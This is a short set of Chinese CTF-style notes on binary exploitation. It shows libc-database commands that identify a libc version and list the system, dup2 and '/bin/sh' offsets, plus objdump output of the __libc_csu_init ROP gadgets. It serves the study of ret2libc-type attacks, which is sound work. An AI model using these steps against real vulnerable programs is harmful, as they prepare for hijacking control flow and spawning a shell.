## 根据main返回地址低3位找libc

```
$ ./find __libc_start_main_ret f45
```

```
ubuntu-trusty-amd64-libc6 (id libc6_2.19-0ubuntu6.9_amd64)
```

## 列出libc中的偏移量

```
$ ./dump libc6_2.19-0ubuntu6.9_amd64
```

```
offset___libc_start_main_ret = 0x21f45
offset_system = 0x0000000000046590
offset_dup2 = 0x00000000000ebe90
offset_read = 0x00000000000eb6a0
offset_write = 0x00000000000eb700
offset_str_bin_sh = 0x17c8c3
```

## 查找gadgets

```
$ objdump -d ./a.out
```

```
  400600:       4c 89 ea                mov    rdx,r13
  400603:       4c 89 f6                mov    rsi,r14
  400606:       44 89 ff                mov    edi,r15d
  400609:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
  40060d:       48 83 c3 01             add    rbx,0x1
  400611:       48 39 eb                cmp    rbx,rbp
  400614:       75 ea                   jne    400600 <__libc_csu_init+0x40>
  400616:       48 83 c4 08             add    rsp,0x8
  40061a:       5b                      pop    rbx
  40061b:       5d                      pop    rbp
  40061c:       41 5c                   pop    r12
  40061e:       41 5d                   pop    r13
  400620:       41 5e                   pop    r14
  400622:       41 5f                   pop    r15
  400624:       c3                      ret    
```
